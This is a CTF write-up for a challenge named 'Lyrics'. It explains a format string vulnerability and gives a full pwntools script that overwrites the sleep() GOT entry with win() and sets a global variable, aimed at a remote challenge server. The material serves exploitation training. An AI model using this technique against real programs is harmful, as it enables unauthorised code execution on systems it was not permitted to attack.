# Lyrics

Author v10l3nt

## Description

We started creating a binary that found ryhmes for us. But bitcoin crashed and we decided to take a nap with all of our problems.

0.cloud.chals.io:29376

## Overview

The binary is vulnerable to a simple format string exploit that can overwrite a GOT entry like CTF-Editor.

The offset needed was determined using GDB to manully find the offset of 6. The offset was then used with pwntools' `fmtstr_payload()` function to generate two valid payloads to overwrite both the `sleep()` GOT entry to `win()` and the `problem` variable to `98`.

## Solution 

```python
from pwn import *
from pwnlib.fmtstr import *

binary = args.BIN

context.terminal = ['tmux', 'splitw', '-h']
e = context.binary = ELF(binary, checksec=False)
r = ROP(e)

gs = '''

'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('0.cloud.chals.io', 29376)
    else:
        return process(e.path)

p = start()

sleep = e.got['sleep']
win = e.sym['win']
prob = e.sym['problem']

offset = 6
got_overwrite = fmtstr_payload(offset, {sleep: win})
prob_overwrite = fmtstr_payload(offset, {prob: 98})

p.recvuntil(b'>>>')
p.sendline(got_overwrite)
p.recvuntil(b'>>>')
p.sendline(prob_overwrite)
p.recvuntil(b'Congratulations: ')

p.interactive()

```
